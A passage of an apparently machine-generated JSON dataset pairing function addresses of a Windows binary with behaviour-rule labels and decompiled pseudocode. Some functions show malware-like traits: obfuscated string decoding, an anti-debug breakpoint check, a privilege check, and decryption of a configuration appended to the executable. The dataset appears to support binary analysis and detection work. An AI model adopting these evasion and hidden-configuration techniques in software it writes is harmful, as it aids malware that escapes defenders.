puVar4[1] = uVar1;\n            fcn.0040a32a(param_1 + 0x10, uVar3);\n            iVar2 = param_1 + 0x10 + uVar3;\n            uVar1 = fcn.0040a235();\n            puVar4[2] = uVar1;\n            fcn.0040a32a(iVar2, uVar3);\n            uVar1 = fcn.0040a235();\n            puVar4[3] = uVar1;\n            fcn.0040a32a(iVar2 + uVar3, uVar3);\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 487
    },
    "00409217": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00409217(uint param_1)\n\n{\n    char cVar1;\n    int32_t lpString;\n    int32_t iVar2;\n    uint32_t unaff_EDI;\n    \n    iVar2 = 0;\n    if (1 < unaff_EDI) {\n        cVar1 = fcn.00409f19(param_1);\n        if (cVar1 != '\\0') {\n            lpString = fcn.00406338(0);\n            if (lpString != 0) {\n                iVar2 = fcn.004091a1(unaff_EDI, 6);\n                if (iVar2 != 0) {\n                    fcn.00408d65(lpString, 0, param_1);\n                }\n                fcn.00406445();\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 183
    },
    "004097f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.004097f5(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpVersionInformation;\n    uint32_t s;\n    uint SidToCheck;\n    int32_t var_14h;\n    uint IsMember;\n    uint cbSid;\n    uint ExistingTokenHandle;\n    int32_t DuplicateTokenHandle;\n    \n    IsMember = 0;\n    ExistingTokenHandle = 0;\n    DuplicateTokenHandle = 0;\n    cbSid = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(10, &ExistingTokenHandle);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    if (iVar3 != 0) {\n        lpVersionInformation = 0x114;\n        sub.ntdll.dll_memset(&s, 0, 0x110);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n        pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n        if (iVar3 != 0) {\n            if (5 < s) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(ExistingTokenHandle, 0x12, &var_14h, 4, &cbSid);\n                if (iVar3 == 0) goto code_r0x004098e1;\n                if (var_14h == 3) {\n                    iVar3 = (*pcVar1)(ExistingTokenHandle, 0x13, &DuplicateTokenHandle, 4, &cbSid);\n                    if (iVar3 == 0) goto code_r0x004098e1;\n                }\n            }\n            if (DuplicateTokenHandle == 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_DuplicateToken)(ExistingTokenHandle, 1, &DuplicateTokenHandle);\n                if (iVar3 == 0) goto code_r0x004098e1;\n            }\n            cbSid = 0x44;\n            iVar3 = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x1a, 0, &SidToCheck, &cbSid);\n            if (iVar3 != 0) {\n                (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(DuplicateTokenHandle, &SidToCheck, &IsMember);\n            }\n        }\n    }\ncode_r0x004098e1:\n    fcn.00408489();\n    fcn.00408489();\n    return IsMember;\n}\n",
        "token_count": 556
    },
    "0040a421": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040a421(uint *param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = param_1[1];\n    if (uVar2 < 2) {\n        uVar2 = 1;\n    }\n    fcn.0040a29a(uVar2 + 1);\n    iVar1 = fcn.0040d1a4(*param_1, uVar2);\n    if (iVar1 == 0) {\n        in_EAX[1] = uVar2;\n    }\n    else {\n        *(*in_EAX + uVar2 * 4) = iVar1;\n        in_EAX[1] = uVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0040a467": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040a467(uint *param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t n;\n    \n    n = param_1[1];\n    if (n < 2) {\n        n = 1;\n    }\n    fcn.0040a29a(n);\n    fcn.0040d1db(*param_1);\n    *(in_EAX + 4) = n;\n    return;\n}\n",
        "token_count": 98
    },
    "0040a4f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a4f5(uint *arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t n;\n    uint *unaff_ESI;\n    uint var_4h;\n    \n    uVar1 = arg_ch[1];\n    if (uVar1 == 1) {\n        uVar2 = fcn.0040a495(arg_8h, **arg_ch);\n    }\n    else {\n        n = arg_8h[1];\n        if (arg_8h[1] <= uVar1) {\n            n = uVar1;\n        }\n        fcn.0040a29a(n);\n        fcn.0040a29a(n);\n        fcn.0040a29a(n * 2);\n        fcn.0040ca3a(*arg_8h, *arg_ch, n);\n        uVar2 = fcn.0040cf67(*unaff_ESI);\n        unaff_ESI[1] = uVar2;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 249
    },
    "0040b1a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040b1a3(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t *in_EAX;\n    char extraout_CL;\n    char cVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint var_124h;\n    int32_t var_20h;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_5h;\n    \n    if ((in_EAX[1] & 1U) != 0) {\n        in_EAX[1] = in_EAX[1] & 0xfffffffb;\n    }\n    iVar2 = *in_EAX;\n    if (iVar2 < 1) {\n        return 0;\n    }\n    if (iVar2 < 3) {\n        in_EAX[3] = 1;\n        return 1;\n    }\n    if (iVar2 == 3) {\n        if (arg_ch == 0) {\n            return 0;\n        }\n        for (uVar7 = 0; ((in_EAX[3] == 0 || (uVar7 < in_EAX[3])) && (*(arg_ch + uVar7) != '\\0')); uVar7 = uVar7 + 1) {\n        }\ncode_r0x0040b32d:\n        in_EAX[3] = uVar7;\n        return uVar7;\n    }\n    if (iVar2 == 4) {\n        if (arg_ch == 0) {\n            return 0;\n        }\n        for (uVar7 = 0; ((in_EAX[3] == 0 || (uVar7 < in_EAX[3])) && (*(arg_ch + uVar7 * 2) != 0)); uVar7 = uVar7 + 1) {\n        }\n        goto code_r0x0040b32d;\n    }\n    if (3 < iVar2 - 5U) {\n        return 0;\n    }\n    var_5h._0_1_ = ~*(in_EAX + 1) & 0x20 | 7;\n    var_10h = 10;\n    if (iVar2 == 7) {\n        var_10h = 0x10;\n    }\n    else if (iVar2 == 8) {\n        var_10h = 8;\n    }\n    var_ch = &var_124h;\n    pcVar6 = arg_8h;\n    if (iVar2 != 5) goto code_r0x0040b27d;\n    if (arg_10h < 1) {\n        if (arg_10h < 0) {\n            *arg_8h = '-';\n            goto code_r0x0040b26c;\n        }\n        if (-1 < arg_10h) {\n            if ((0 < arg_10h) || (arg_ch != 0)) goto code_r0x0040b251;\n            goto code_r0x0040b26d;\n        }\n    }\n    else {\ncode_r0x0040b251:\n        if ((in_EAX[1] & 0x200U) == 0) {\n            if ((in_EAX[1] & 0x400U) != 0) {\n                *arg_8h = ' ';\n                goto code_r0x0040b26c;\n            }\n        }\n        else {\n            *arg_8h = '+';\ncode_r0x0040b26c:\n            pcVar6 = arg_8h + 1;\n        }\ncode_r0x0040b26d:\n        if ((0 < arg_10h) || (-1 < arg_10h)) goto code_r0x0040b27d;\n    }\n    arg_ch = -arg_ch;\ncode_r0x0040b27d:\n    var_14h = in_EAX[1];\n    var_18h = 0;\n    do {\n        iVar8 = sub.ntdll.dll__aulldvrm();\n        cVar5 = extraout_CL + '0';\n        if ('9' < cVar5) {\n            cVar5 = cVar5 + var_5h;\n        }\n        var_20h = arg_ch;\n        puVar4 = var_ch + 1;\n        *var_ch = cVar5;\n        var_ch = puVar4;\n        arg_ch = iVar8;\n    } while (iVar8 != 0);\n    while (&var_124h < var_ch) {\n        var_ch = var_ch + -1;\n        *pcVar6 = *var_ch;\n        pcVar6 = pcVar6 + 1;\n    }\n    *pcVar6 = '\\0';\n    uVar7 = pcVar6 - arg_8h;\n    puVar1 = in_EAX + 3;\n    if (*puVar1 < uVar7) {\n        *puVar1 = uVar7;\n    }\n    if ((var_14h & 4) == 0) {\n        return uVar7;\n    }\n    uVar3 = in_EAX[2];\n    if (uVar3 < *puVar1 || uVar3 == *puVar1) {\n        return uVar7;\n    }\n    *puVar1 = uVar3;\n    return uVar7;\n}\n",
        "token_count": 1226
    },
    "0040bd94": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040bd94(void)\n\n{\n    fcn.00406338(0);\n    return;\n}\n",
        "token_count": 26
    },
    "0040cfe1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cfe1(uint param_1, uint *param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (1 < in_EAX) {\n        puVar2 = param_2 + 1;\n        for (iVar1 = in_EAX - 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    *param_2 = 1;\n    return;\n}\n",
        "token_count": 136
    },
    "0040d1a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d1a4(uint32_t param_1, uint32_t *param_2, int32_t *param_3, uint32_t param_4)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    bVar4 = *param_3 + param_1 < param_1;\n    *param_2 = *param_3 + param_1;\n    if (1 < param_4) {\n        puVar1 = param_2 + 1;\n        iVar3 = param_4 - 1;\n        do {\n            uVar2 = *((param_3 - param_2) + puVar1) + bVar4;\n            bVar4 = uVar2 < bVar4;\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "0040d1db": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d1db(uint param_1, uint32_t *param_2, int32_t *param_3)\n\n{\n    uint32_t in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    bVar4 = 0xfffffffe < *param_3 - 1U;\n    *param_2 = *param_3 - 1U;\n    if (1 < in_EAX) {\n        puVar1 = param_2 + 1;\n        iVar3 = in_EAX - 1;\n        do {\n            uVar2 = *((param_3 - param_2) + puVar1) - bVar4;\n            bVar4 = -bVar4 - 1 < uVar2;\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "0040db32": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040db32(uint32_t param_1)\n\n{\n    uchar uVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_4h;\n    \n    if (in_EAX < 3) {\n        return 2;\n    }\n    var_4h = param_1;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = fcn.00408a11();\n            *(&var_4h + uVar3) = uVar1;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 4);\n        uVar3 = 0x80000000;\n        iVar2 = 0x20;\n        do {\n            if ((in_EAX - 2 & uVar3) != 0) break;\n            iVar2 = iVar2 + -1;\n            uVar3 = uVar3 >> 1;\n        } while (0 < iVar2);\n        if (iVar2 < 0x20) {\n            uVar3 = uVar3 * 2 - 1;\n        }\n        else {\n            uVar3 = 0xffffffff;\n        }\n        var_4h = var_4h & uVar3;\n        if (var_4h <= in_EAX - 2) {\n            return var_4h + 2;\n        }\n    } while( true );\n}\n",
        "token_count": 323
    },
    "0040db8e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040db8e(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t arg_ch_00;\n    int32_t unaff_ESI;\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0040bd94();\n    arg_8h_01 = fcn.0040bd94();\n    arg_ch_00 = fcn.0040bd94();\n    uVar2 = fcn.0040cf67(arg_10h);\n    iVar1 = uVar2;\n    if (iVar1 == 0) {\n        fcn.0040cfe1();\n    }\n    else {\n        var_8h = 0x80000000;\n        do {\n            if ((var_8h & *((uVar2 >> 0x20) + -4 + iVar1 * 4)) != 0) break;\n            var_8h = var_8h >> 1;\n        } while (var_8h != 0);\n        if (var_8h == 1) {\n            var_8h = 0x80000000;\n            iVar1 = iVar1 + -1;\n        }\n        else {\n            var_8h = var_8h >> 1;\n        }\n        fcn.0040cfad(arg_ch);\n        if (iVar1 != 0) {\n            var_14h = arg_10h + -4 + iVar1 * 4;\n            do {\n                fcn.0040cda3(arg_8h_00, arg_ch_00, unaff_ESI);\n                fcn.0040cb05(arg_8h_01, arg_ch_00, arg_8h_00, unaff_ESI * 2, arg_14h, unaff_ESI);\n                if ((*var_14h & var_8h) != 0) {\n                    fcn.0040ca3a(arg_ch, arg_ch_00, unaff_ESI);\n                    fcn.0040cb05(arg_8h_01, arg_ch_00, arg_8h_00, unaff_ESI * 2, arg_14h, unaff_ESI);\n                }\n                if (var_8h == 1) {\n                    iVar1 = iVar1 + -1;\n                    var_14h = var_14h + -1;\n                    var_8h = 0x80000000;\n                }\n                else {\n                    var_8h = var_8h >> 1;\n                }\n            } while (iVar1 != 0);\n        }\n        fcn.0040cfad(arg_ch_00);\n    }\n    if (arg_8h_00 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_8h_01 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_ch_00 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    return 0;\n}\n",
        "token_count": 768
    },
    "0040e036": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040e036(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iStack4;\n    \n    if (*0x42f18c == 1) {\n        iStack4 = 0;\n        if (0 < param_2) {\n            do {\n                puVar1 = param_1 + iStack4 * 8;\n                uVar3 = puVar1[1];\n                uVar4 = uVar3 << 0x10;\n                uVar2 = uVar3 >> 0x10 ^ uVar4;\n                uVar3 = (*puVar1 ^ uVar3) >> 0x10 ^ (*puVar1 << 0x10 | uVar3 >> 0x10);\n                iStack4 = iStack4 + 1;\n                *puVar1 = (uVar2 >> 8 ^ uVar2 << 8) & 0xff00ff ^ uVar2 << 8;\n                puVar1[1] = (uVar3 >> 8 ^ (uVar3 << 8 | uVar4 >> 0x18)) & 0xff00ff ^ (uVar3 << 8 | uVar4 >> 0x18);\n            } while (iStack4 < param_2);\n        }\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "0040f531": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.0040f531(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint pllRet;\n    uint var_4h;\n    \n    pllRet = 0;\n    var_4h = 0;\n    cVar2 = fcn.0040f21e();\n    if (cVar2 != '\\0') {\n        iVar1 = *(in_EAX + 0x14);\n        if (iVar1 == 0) {\n            var_4h = 0;\n            if (*(in_EAX + 0x20) == '\\0') {\n                pllRet = 0;\n            }\n            else {\n                pllRet = 1;\n            }\n        }\n        else if (iVar1 == 2) {\n            pllRet = *(in_EAX + 0x20);\n            var_4h = *(in_EAX + 0x24);\n        }\n        else if (iVar1 == 3) {\n            (*_sym.imp.SHLWAPI.dll_StrToInt64ExA)(*(in_EAX + 0x20), 0, &pllRet);\n        }\n    }\n    return CONCAT44(var_4h, pllRet);\n}\n",
        "token_count": 264
    },
    "0040f598": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.0040f598(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t unaff_EDI;\n    uint uVar3;\n    uint arg_ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    var_4h = 0;\n    cVar2 = fcn.0040f21e();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    if (*(unaff_EDI + 0x14) != 3) {\n        fcn.00406445();\n        *(unaff_EDI + 0x28) = 0;\n    }\n    iVar1 = *(unaff_EDI + 0x14);\n    if (iVar1 == 0) {\n        if (*(unaff_EDI + 0x20) == '\\0') {\n            arg_10h = 0xf06a508a;\n            arg_ch = 5;\n            uVar3 = 0x41289c;\n        }\n        else {\n            arg_10h = 0x78eba6a5;\n            arg_ch = 4;\n            uVar3 = 0x412894;\n        }\n    }\n    else {\n        if (iVar1 == 2) {\n            uVar3 = fcn.00405e30(0x4128a4, 5, 0x228c6e55, 0);\n            fcn.00409488(uVar3, *(unaff_EDI + 0x20));\n            goto code_r0x0040f5f9;\n        }\n        if (iVar1 != 1) {\n            if (iVar1 != 3) {\n                return 0;\n            }\n            return *(unaff_EDI + 0x20);\n        }\n        arg_10h = 0x96943865;\n        arg_ch = 4;\n        uVar3 = 0x4128ac;\n    }\n    uVar3 = fcn.00405e30(uVar3, arg_ch, arg_10h, 0);\n    var_4h = fcn.004092af(uVar3);\ncode_r0x0040f5f9:\n    *(unaff_EDI + 0x28) = var_4h;\n    return var_4h;\n}\n",
        "token_count": 504
    },
    "00401ae2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401ae2(uint arg_8h, uint lpBuffer)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t unaff_EDI;\n    uint arg_ch;\n    uint lpNumberOfBytesWritten;\n    uint lpFileName;\n    \n    fcn.00407bf2();\n    uVar3 = 0;\n    arg_ch = 0x42eda8;\n    arg_8h_00 = fcn.00406209(0x412074, 9, 0x2360e4ef, 0x42eda8, arg_8h);\n    fcn.00409428(arg_8h_00, arg_ch);\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x40000000, 1, 0, 2, 0, 0);\n    if (uVar1 != 0xffffffff) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(uVar1, lpBuffer);\n        if ((iVar2 != 0) && (unaff_EDI == in_ECX)) {\n            uVar3 = 1;\n        }\n        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar1);\n        uVar1 = fcn.00408489();\n    }\n    return uVar1 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 336
    },
    "00401b83": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b83(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_ch_00;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t hFile;\n    \n    arg_ch_00 = 0x42eda8;\n    arg_8h_00 = fcn.00406209(0x412074, 9, 0x2360e4ef, 0x42eda8, arg_8h);\n    fcn.00409428(arg_8h_00, arg_ch_00);\n    iVar3 = 0;\n    hFile = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0, 0);\n    if (hFile != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetFileSize)(hFile, 0);\n        if (arg_ch != NULL) {\n            *arg_ch = iVar1;\n        }\n        iVar3 = fcn.00406338(0);\n        if (iVar3 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, iVar3, iVar1, &lpNumberOfBytesRead, 0);\n            if ((iVar2 == 0) || (iVar1 != lpNumberOfBytesRead)) {\n                fcn.00406445();\n                iVar3 = 0;\n            }\n        }\n        fcn.00408489();\n    }\n    return iVar3;\n}\n",
        "token_count": 371
    },
    "00402bf5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402bf5(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint ARG_0;\n    uint var_38h;\n    uchar uStack55;\n    uint lpBuffer;\n    int32_t var_28h;\n    int32_t lpBaseAddress;\n    uchar *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t lpOutputString;\n    int32_t lpNumberOfBytesRead;\n    int32_t nNumberOfBytesToRead;\n    int32_t hFile;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\0';\n    hFile = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x42e780, 0x80000000, 1, 0, 3, 0, 0);\n    if (hFile != -1) {\n        var_28h = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(hFile, 0, 2, 0, 0, 0);\n        if (var_28h != 0) {\n            lpBaseAddress = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(var_28h, 4, 0, 0, 0);\n            if (lpBaseAddress != 0) {\n                iVar4 = *(lpBaseAddress + 0x3c) + lpBaseAddress;\n                uVar7 = *(iVar4 + 6);\n                uVar8 = 0;\n                uVar9 = 0;\n                if (*(iVar4 + 6) != 0) {\n                    puVar5 = *(iVar4 + 0x14) + iVar4 + 0x2c;\n                    do {\n                        uVar1 = *puVar5;\n                        if (uVar8 < uVar1) {\n                            uVar9 = puVar5[-1] + uVar1;\n                            uVar8 = uVar1;\n                        }\n                        puVar5 = puVar5 + 10;\n                        uVar7 = uVar7 - 1;\n                    } while (uVar7 != 0);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetFileSize)(hFile, 0);\n                if (uVar9 < uVar8) {\n                    (*_sym.imp.KERNEL32.dll_SetFilePointer)(hFile, uVar8 - 5, 0, 0);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, &lpBuffer, 5, &lpNumberOfBytesRead, 0);\n                    pcVar2 = _sym.imp.KERNEL32.dll_SetFilePointer;\n                    if ((iVar4 != 0) && (lpNumberOfBytesRead == 5)) {\n                        var_38h._0_1_ = 0;\n                        stack0xffffffc5 = 0;\n                        uStack55 = 0;\n                        (*_sym.imp.KERNEL32.dll_SetFilePointer)(hFile, uVar8 - 10, 0, 0);\n                        iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, &var_38h, 5, &lpNumberOfBytesRead, 0);\n                        if ((iVar4 != 0) && (lpNumberOfBytesRead == 5)) {\n                            fcn.00406bdd(&lpBuffer, 5, &var_38h, 5, 0);\n                            nNumberOfBytesToRead = fcn.00409014();\n                            var_1ch = fcn.00406338(0);\n                            if (var_1ch != 0) {\n                                (*pcVar2)(hFile, (uVar8 - nNumberOfBytesToRead) + -10, 0, 0);\n                                iVar4 = var_1ch;\n                                (*_sym.imp.KERNEL32.dll_ReadFile)\n                                          (hFile, var_1ch, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n                                fcn.00406bdd(&lpBuffer, 5, iVar4, nNumberOfBytesToRead, 0);\n                                uVar6 = fcn.00405e30(0x412268, 6, 0x8277255f, 0);\n                                iVar4 = fcn.00402bb5(nNumberOfBytesToRead, uVar6);\n                                if (iVar4 != 0) {\n                                    var_18h = iVar4 + 6;\n                                    uVar6 = fcn.00405e30(0x412268, 6, 0x8277255f, 0);\n                                    var_20h = (*_sym.imp.SHLWAPI.dll_StrStrA)(iVar4 + 6, uVar6);\n                                    if (var_20h != NULL) {\n                                        *var_20h = 0;\n                                        cVar3 = fcn.00403ed8(arg_8h);\n                                        if (cVar3 != '\\0') {\n                                            uVar6 = fcn.00405e30(0x412270, 0x19, 0x6b2aa8e6, 0);\n                                            fcn.00409488(uVar6, nNumberOfBytesToRead);\n                                            (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(lpOutputString);\n                                            fcn.00406445();\n                                        }\n                                        lpOutputString = fcn.0040f651(var_18h, &nNumberOfBytesToRead);\n                                        if (lpOutputString != 0) {\n                                            uVar6 = fcn.00405e30(0x41228c, 1, 0x1c77ee7d, 0);\n                                            fcn.0040f475(uVar6);\n                                            uVar6 = fcn.0040f598();\n                                            *0x42e988 = fcn.004092af(uVar6);\n                                            if (*0x42e988 != 0) {\n                                                uVar6 = fcn.00405e30(0x412290, 1, 0xfcb49537, 0);\n                                                var_20h = fcn.0040f475(uVar6);\n                                                if (var_20h != NULL) {\n                                                    uVar8 = fcn.0040f418();\n                                                    if (uVar8 < 6) {\n                                                        *0x42e98c = fcn.0040f418();\n                                                    }\n                                                    else {\n                                                        *0x42e98c = 5;\n                                                    }\n                                                    *0x42e77c = fcn.00406338(8);\n                                                    uVar8 = 0;\n                                                    if (*0x42e98c != 0) {\n                                                        do {\n                                                            fcn.0040f43f(uVar8);\n                                                            uVar6 = fcn.0040f598();\n                                                            uVar6 = fcn.004092af(uVar6);\n                                                            *(*0x42e77c + uVar8 * 4) = uVar6;\n                                                            uVar8 = uVar8 + 1;\n                                                        } while (uVar8 < *0x42e98c);\n                                                    }\n                                                    var_1h._0_1_ = '\\x01';\n                                                }\n                                                uVar6 = fcn.00405e30(0x412294, 1, 0xd2b6916e, 0);\n                                                fcn.0040f475(uVar6);\n                                                *0x414c14 = fcn.0040f531();\n                                            }\n                                            fcn.0040f362();\n                                        }\n                                    }\n                                }\n                                fcn.00406445();\n                            }\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(lpBaseAddress);\n            }\n            fcn.00408489();\n        }\n        fcn.00408489();\n        if (var_1h != '\\0') {\n            return;\n        }\n    }\n    uVar6 = fcn.00405e30(0x412298, 7, 0x3e9ed5b7, 0);\n    var_1ch = fcn.0040f475(uVar6);\n    if (var_1ch != 0) {\n        uVar6 = fcn.00405e30(0x4122a0, 3, 0x6b68b514, 0);\n        fcn.0040f475(uVar6);\n        uVar6 = fcn.0040f598();\n        *0x42e988 = fcn.004092af(uVar6);\n        *0x42e98c = 5;\n        *0x42e77c = fcn.00406338(8);\n        uVar8 = 